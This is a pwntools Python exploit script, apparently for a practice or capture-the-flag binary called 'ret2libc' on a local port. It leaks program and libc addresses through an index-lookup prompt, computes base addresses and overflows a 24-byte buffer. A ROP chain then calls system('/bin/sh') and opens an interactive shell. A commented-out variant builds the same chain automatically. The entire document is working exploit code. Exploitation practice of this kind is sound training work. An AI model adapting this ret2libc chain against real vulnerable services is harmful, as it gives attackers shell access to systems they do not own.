#!/usr/bin/python3
from pwn import *
PATH = './ret2libc'
ADDR = '127.0.0.1'
PORT = 9004
elf = context.binary = ELF(PATH)
context.log_level = 'debug'
gs = '''
b* vulnerable
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    elif args.REMOTE:
        return remote(ADDR,PORT)
    elif args.GDBWIN:
        context.terminal = ['wt.exe','wsl.exe','script', '-q', 'gdb_sess', '-c']
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
io = start()
######################
libc = elf.libc
io.sendlineafter(b'Enter index to lookup: \n', b'3')
leak_elf = int(io.recvline().decode().strip().split(': ')[1],16)
log.info(f'leak_elf: {leak_elf}')

io.sendlineafter(b'Enter index to lookup: \n', b'4')
libc_leak = int(io.recvline().decode().strip().split(': ')[1], 16)
log.info(f'libc_leak: {hex(libc_leak)}')

elf.address = leak_elf - elf.sym['vulnerable']
log.info(f'elf base: {hex(elf.address)}')

libc.address = libc_leak - libc.sym['puts']
log.info(f'libc base: {hex(libc.address)}')

log.info(f'offset: {cyclic_find(b"gaaa")}') # 24
# payload = cyclic(200)
# io.sendlineafter(b'Enter some text: \n', payload)

rop = ROP(libc)
ret = rop.find_gadget(['ret'])[0] # stack alignment
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']
payload = flat(
    b'A'*24,
    ret,
    pop_rdi,
    binsh,
    system
)
io.sendlineafter(b'Enter some text: \n', payload)

# ## autromate rop chain
# rop = ROP(libc)
# rop.raw(rop.find_gadget(['ret'])[0]) # stack alignment
# rop.system(next(libc.search(b'/bin/sh\x00')))
# log.info(rop.dump())
# payload = flat( 
#     b'A'*24,
#     rop.chain()
# )
# io.sendlineafter(b'Enter some text: \n', payload)


io.interactive()